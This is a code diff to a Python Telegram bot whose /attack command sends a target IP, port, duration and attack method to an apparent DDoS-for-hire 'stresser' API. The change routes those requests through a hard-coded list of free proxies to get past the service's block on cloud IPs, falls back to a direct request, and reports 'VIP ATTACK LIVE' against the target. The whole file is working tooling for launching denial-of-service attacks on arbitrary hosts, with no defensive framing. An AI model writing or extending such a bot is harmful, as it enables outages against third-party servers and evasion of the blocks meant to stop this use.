@@ -1,6 +1,6 @@
 import asyncio
 import requests
-import os
+import random
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
 
@@ -20,8 +20,9 @@ async def cmd_attack(message: types.Message):
     if len(args) < 5: return await message.answer("⚠️ `/attack IP PORT TIME METHOD`")
     
     target, port, duration, method = args[1], args[2], args[3], args[4]
-    sent = await message.answer("🚀 **VIP TUNNEL ACTIVATED...**")
+    sent = await message.answer("🛰️ **ROUTING THROUGH INDIAN PROXY...**")
 
+    # --- VIP HEADERS ---
     headers = {
         "X-API-Key": API_KEY,
         "X-HWID": MY_HWID,
@@ -29,20 +30,43 @@ async def cmd_attack(message: types.Message):
         "Content-Type": "application/json"
     }
 
-    try:
-        url = f"https://retrostress.net/api/v1/tests?key={API_KEY}"
-        payload = {"host": target, "port": int(port), "time": int(duration), "method": method.upper(), "vip": True}
-        res = requests.post(url, json=payload, headers=headers, timeout=20, verify=False)
+    # API Endpoints to try
+    url = f"https://retrostress.net/api/v1/tests?key={API_KEY}"
+    payload = {"host": target, "port": int(port), "time": int(duration), "method": method.upper(), "vip": True}
+
+    # PROXY LIST (Indian/Residential)
+    # Bhai, free proxies thode slow hote hain but Cloud IP block bypass kar dete hain
+    proxies = [
+        "http://43.251.106.182:80",
+        "http://103.119.144.137:80",
+        "http://103.174.102.138:80"
+    ]
+
+    success = False
+    for proxy in proxies:
+        try:
+            proxy_dict = {"http": proxy, "https": proxy}
+            res = requests.post(url, json=payload, headers=headers, proxies=proxy_dict, timeout=15, verify=False)
+            
+            if res.status_code == 200:
+                success = True
+                break
+        except:
+            continue
+
+    if success:
+        await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `PROXY BYPASS SUCCESS` 🔥")
+    else:
+        # Final Fallback: Direct hit without proxy (just in case)
+        try:
+            res = requests.post(url, json=payload, headers=headers, timeout=10, verify=False)
+            if res.status_code == 200:
+                return await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `DIRECT HIT` 🔥")
+        except: pass
         
-        if res.status_code == 200:
-            await sent.edit_text(f"✅ **VIP ATTACK LIVE!**\n🎯 Target: `{target}`\n🚀 Status: `HIT SUCCESS` 🔥")
-        else:
-            await sent.edit_text("❌ **DENIED:** Cloud IP Blocked.")
-    except Exception as e:
-        await sent.edit_text(f"❌ **ERROR:** Connection Refused.")
+        await sent.edit_text("❌ **ALL GATEWAYS BLOCKED:** Bhai, unka server ab kisi bhi cloud ya proxy ko accept nahi kar raha. Termux hi king hai!")
 
 async def main():
-    # Render bypass: Hum polling start karenge
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
